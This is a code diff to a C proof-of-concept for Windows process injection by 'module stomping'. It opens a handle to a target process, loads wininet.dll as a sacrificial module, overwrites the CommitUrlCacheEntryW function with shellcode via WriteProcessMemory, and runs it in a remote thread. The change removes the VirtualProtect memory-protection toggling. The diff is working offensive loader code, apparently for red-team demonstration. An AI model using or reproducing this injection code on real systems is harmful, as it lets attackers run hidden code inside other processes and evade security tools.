@@ -47,7 +47,7 @@ int main() {
         return -1;
     }
     printf("[*] Successfully opened handle to PID: %u\n", pid);
-  
+
     // load sacrificial DLL, using wininet because it is fairly large and so it can accomodate different PoC payloads
     HMODULE hSacrificialDll = LoadLibraryExA("wininet.dll", NULL, DONT_RESOLVE_DLL_REFERENCES);
     if (hSacrificialDll == NULL) {
@@ -63,20 +63,11 @@ int main() {
     }
     printf("[*] Target wininet.dll!CommitUrlCacheEntryW located at: : 0x%016llx\n", bufferAddress);
 
-    // Write the shellcode to the block of memory that we allocated with VirtualAllocEx
+    // Write the shellcode to the block of memory that we located with GetProcAddress
     BOOL writeShellcode = WriteProcessMemory(pHandle, bufferAddress, buf, sizeof buf, NULL);
     if(writeShellcode == false) {
         printf("[ERROR] Failed to write shellcode! Using addresss: 0x%016llx, Error: %lu\n", bufferAddress, GetLastError());
         FreeLibrary(hSacrificialDll);
-        return -1;
-    }
-
-    // Update the memory protection value to RWX
-    DWORD lpOldProtect = NULL;
-    BOOL updateMemoryProtection = VirtualProtect(bufferAddress, sizeof buf, PAGE_EXECUTE_READWRITE, &lpOldProtect);
-    if(updateMemoryProtection == false) {
-        printf("[ERROR] Failed to update memory protection (updating from RW to RWX)! Using addresss: 0x%016llx, Error: %lu\n", bufferAddress, GetLastError());
-        VirtualFree(bufferAddress, 0, MEM_RELEASE);
         return -1;
     }
 
@@ -91,14 +82,6 @@ int main() {
     // Wait for the thread to return - not required, but it definitely makes the demonstration much cleaner
     printf("[*] Waiting for the thread to return...\n");
     WaitForSingleObject(tHandle, INFINITE);
-
-    // Update the memory protection value from RWX to RW
-    updateMemoryProtection = VirtualProtect(bufferAddress, sizeof buf, PAGE_READWRITE, &lpOldProtect);
-    if(updateMemoryProtection == false) {
-        printf("[ERROR] Failed to update memory protection (toggling back to RW)! Using addresss: 0x%016llx, Error: %lu\n", bufferAddress, GetLastError());
-        FreeLibrary(hSacrificialDll);
-        return -1;
-    }
 
     // Clean up open handles and free the shellcode buffer memory
     CloseHandle(pHandle);
